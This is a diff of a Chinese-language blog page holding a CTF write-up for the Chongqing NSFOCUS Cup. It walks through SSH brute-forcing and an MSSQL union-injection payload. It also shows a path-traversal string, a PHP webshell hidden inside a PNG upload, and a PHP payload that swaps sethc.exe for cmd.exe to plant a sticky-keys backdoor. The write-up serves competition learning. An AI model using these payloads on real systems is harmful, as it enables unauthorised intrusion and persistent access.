@@ -1,482 +1,247 @@
 <!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="T3stzer0">
+
+
+    <meta name="subtitle" content="思考">
 
 
 
 
+<title>CCTF（重庆绿盟杯）比赛writeUp | T3stzer0&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
 
 
 
 
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
 
 
 
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh-CN">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
 
 
 
-
-
-
-
-
-
-
-  <meta name="google-site-verification" content="googlea4e6eb27cf4f8663.html"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=7.0.1"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg?v=7.0.1">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg?v=7.0.1">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.0.1',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
 </script>
 
 
-  
+    
 
-
-
-
-  <meta name="keywords" content="CTF,WriteUp">
-<meta property="og:type" content="article">
-<meta property="og:title" content="CCTF（重庆绿盟杯）比赛writeUp">
-<meta property="og:url" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/index.html">
-<meta property="og:site_name" content="Wz&#39;s Blog">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-17-21.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-28.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-37-40.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-40-49.jpg">
-<meta property="og:updated_time" content="2019-01-22T04:54:02.116Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CCTF（重庆绿盟杯）比赛writeUp">
-<meta name="twitter:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg">
-
-
-
-
-
-  
-  
-  <link rel="canonical" href="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/"/>
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>CCTF（重庆绿盟杯）比赛writeUp | Wz's Blog</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Wz's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <p class="site-subtitle">安全菜鸡的挖坑填坑之旅</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>归档</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-    
-
-  
-
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/testzero-wz" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="W z"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/images/avatar.gif"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Wz's Blog"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">CCTF（重庆绿盟杯）比赛writeUp
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Home</a></div>
+            <div class="menu navbar-right">
                 
-              
-
-              <time title="创建时间：2017-09-24 01:05:00" itemprop="dateCreated datePublished" datetime="2017-09-24T01:05:00+08:00">2017-09-24</time>
-            
-
-            
-              
-
-              
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-                <span class="post-meta-divider">|</span>
+                    <a class="menu-item" href="/category">Categories</a>
                 
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-                  <span class="post-meta-item-text">更新于</span>
+                    <a class="menu-item" href="/about">About</a>
                 
-                <time title="修改时间：2019-01-22 12:54:02" itemprop="dateModified" datetime="2019-01-22T12:54:02+08:00">2019-01-22</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/安全之旅/" itemprop="url" rel="index"><span itemprop="name">安全之旅</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-      </header>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
     
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CCTF（重庆绿盟杯）比赛writeUp</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
+                    
 
-      
-      
+                    
+                        <span class="post-time">
+                        Date: <a href="#">九月 24, 2017&nbsp;&nbsp;1:05:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/category/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
 
-      
-        <img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg" alt="21-23-66.jpg" title="">
+        <div class="post-content">
+            <p><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg" alt=""></p>
 <a id="more"></a>
 <h1 id="web1"><a class="markdownIt-Anchor" href="#web1"></a> WEB1</h1>
 <p>靶机只扫描到22的ssh端口<br>
 那么思路只有一个，只能爆破</p>
 <p>用的是一个SSH爆破工具<strong>SSH_Crack</strong><br>
-<strong>百度云下载链接:</strong><a href="https://pan.baidu.com/s/1qX9lyZM" target="_blank" rel="external">https://pan.baidu.com/s/1qX9lyZM</a><br>
+<strong>百度云下载链接:</strong><a href="https://pan.baidu.com/s/1qX9lyZM" target="_blank" rel="noopener">https://pan.baidu.com/s/1qX9lyZM</a><br>
 然后下几个弱密码字典，放进去跑，然而并没有什么用<br>
 最后到结束也没跑出来，跑到怀疑人生。结束后问别队，他们说最后半小时出现了一个5984的端口</p>
 <blockquote>
@@ -504,7 +269,7 @@
 +4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>
 +5432 PostgreSQL<br>
 +5900 vnc<br>
-+5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a><br>
++5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="noopener">http://xxx:5984/_utils/</a><br>
 +6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导&gt;+致网站被直接篡改或者作为代理进入内网<br>
 +6379 redis未授权<br>
 +7001,7002 WebLogic默认弱口令，反序列<br>
@@ -533,22 +298,22 @@
 <p>比赛当时我找到的是一个shop7z的一个通用注入pkid<br>
 因为是MSSQL的数据库，不允许limit，故使用order by修改表序列，是一个显式union注入<br>
 <strong>payload:</strong></p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Union%0a/!5000SelECt/%0a12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8%0aMSysAccessObjects%0aorder%0aby%0a1</span></div></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union%0a/!5000SelECt/%0a12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8%0aMSysAccessObjects%0aorder%0aby%0a1</span></span><br></pre></td></tr></table></figure>
 <p>因为是MSSQL,我平时积累不多,且把<code>@@version</code>替换上面数字会出false的页面，就懵逼了<br>
 大早上没吃早餐，被雨淋，还被空调吹得晕乎乎的，就就此放弃琢磨了这一道MSSQL注入，说实话还是积累太少。</p>
 <h1 id="web3"><a class="markdownIt-Anchor" href="#web3"></a> WEB3</h1>
 <h2 id="一阶段上传绕过"><a class="markdownIt-Anchor" href="#一阶段上传绕过"></a> 一阶段――上传绕过</h2>
 <p><strong>第一步扫描：</strong></p>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-17-21.jpg" alt="21-17-21.jpg" title="">
+<p><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-17-21.jpg" alt=""></p>
 <p>发现开了很多端口<br>
 其中3389和80和8080是我们特别关注的<br>
 进去80是一个IIS的建设中的页面，没啥挖掘的<br>
 8080是一个Apache搭的应用下载市场<br>
 AWVS扫描发现有用的目录遍历漏洞</p>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-28.jpg" alt="21-21-28.jpg" title="">
+<p><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-28.jpg" alt=""></p>
 <h5 id="有问题变量在模板参数tpl处"><a class="markdownIt-Anchor" href="#有问题变量在模板参数tpl处"></a> 有问题变量在模板参数tpl处</h5>
-<p>被设置为<code>../../../../../../../windows/win.ini%00.jpg</code></p>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg" alt="21-21-47.jpg" title="">
+<p>被设置为<code>../../../../../../../windows/win.ini%00.jpg</code><br>
+<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg" alt=""></p>
 <h3 id="科普"><a class="markdownIt-Anchor" href="#科普"></a> 科普</h3>
 <p>还是科普一下<br>
 <code>../</code>是DOS命令及linux的shell命令的上层目录的意思<br>
@@ -562,18 +327,18 @@ windows/win.ini，可以对照一下你C盘的C:\windows\win.ini<br>
 <h3 id="尝试"><a class="markdownIt-Anchor" href="#尝试"></a> 尝试</h3>
 <p>上传点过滤PHP后缀，截断以及该Content-Type无济于事，索性直接上传PNG文件，保留文件头和结束标记，在中间插入一句话<br>
 大概是这样子的</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> system($_POST[<span class="number">1</span>]);<span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-37-40.jpg" alt="21-37-40.jpg" title="">
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_POST[<span class="number">1</span>]);<span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-37-40.jpg" alt=""></p>
 <p>然后上传之后记录上传路径,将tpl改成静态png的路径。<br>
 大概是这样子的</p>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-40-49.jpg" alt="21-40-49.jpg" title="">
+<p><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-40-49.jpg" alt=""></p>
 <p>毕竟环境已经关了，无法有更多详细的截图了，实在抱歉</p>
 <p>随后发现Png被解析成php了，并且提示,<code>system()</code>由于某些安全原因被禁用了</p>
 <p>随后就将一句话构造成这样</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$a=$_POST[<span class="number">2</span>];</div><div class="line"><span class="keyword">echo</span> $a.<span class="string">"\n"</span>;</div><div class="line">$b = scandir($a,<span class="number">1</span>);</div><div class="line">print_r($b);</div><div class="line">phpinfo();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a=$_POST[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"\n"</span>;</span><br><span class="line">$b = scandir($a,<span class="number">1</span>);</span><br><span class="line">print_r($b);</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>同样上传图片，包含新图片路径<br>
 庆幸的是<code>phpinfo()</code>是可以执行的，我们将post数据构造成当前目录路径</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">POST_DATA: <span class="number">2</span>=getcwd();</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST_DATA: <span class="number">2</span>=getcwd();</span><br></pre></td></tr></table></figure>
 <p>执行后得到当前路径以及当前路径所有文件的名字,具体的路径没截图了，反正是C盘下的路径<br>
 以及当前目录下的flag_i4_H37e.txt文件<br>
 利用上面显示win.ini的方法，包含flag_i4_H37e.txt即可得到传马所得flag200分</p>
@@ -619,7 +384,7 @@ windows/win.ini，可以对照一下你C盘的C:\windows\win.ini<br>
 <li>狂按shift键，召唤出被替换成cmd.exe的程序sethc.exe</li>
 </ol>
 <p>于是将一句换木马插入PNG图片的中间：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">unlink(<span class="string">"C:\\Windows\\system32\\sethc.exe"</span>);</div><div class="line">copy(<span class="string">"C:\\Windows\\system32\\cmd.exe"</span>,<span class="string">"C:\\Windows\\system32\\sethc.exe"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">unlink(<span class="string">"C:\\Windows\\system32\\sethc.exe"</span>);</span><br><span class="line">copy(<span class="string">"C:\\Windows\\system32\\cmd.exe"</span>,<span class="string">"C:\\Windows\\system32\\sethc.exe"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>同样的，上传图片木马，包含路径-&gt;解析，然后3389连接WEB3靶机，狂按shift键</p>
 <p>于是很惊喜地发现，cmd.exe被我们召唤出来了</p>
 <p><em><strong>此处图没有机会没保留</strong></em></p>
@@ -640,471 +405,91 @@ DOS权限还是administrator的</p>
 <li>以及还是太菜，继续努力吧</li>
 </ul>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/CTF/" rel="tag"># CTF</a>
-          
-            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
-          
         </div>
-      
 
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/27/NSCTF-Web-WriteUp/" rel="prev" title="NSCTF-Web-WriteUp">
-                NSCTF-Web-WriteUp <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">W z</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            <section class="post-copyright">
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">26</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
-                    
-                      <a href="/categories/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">2</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.testzero-wz.com/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/">https://www.testzero-wz.com/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/</a></span>
+                    </p>
                 
                 
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
 
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
                     
-                  
-                  
                     
-                  
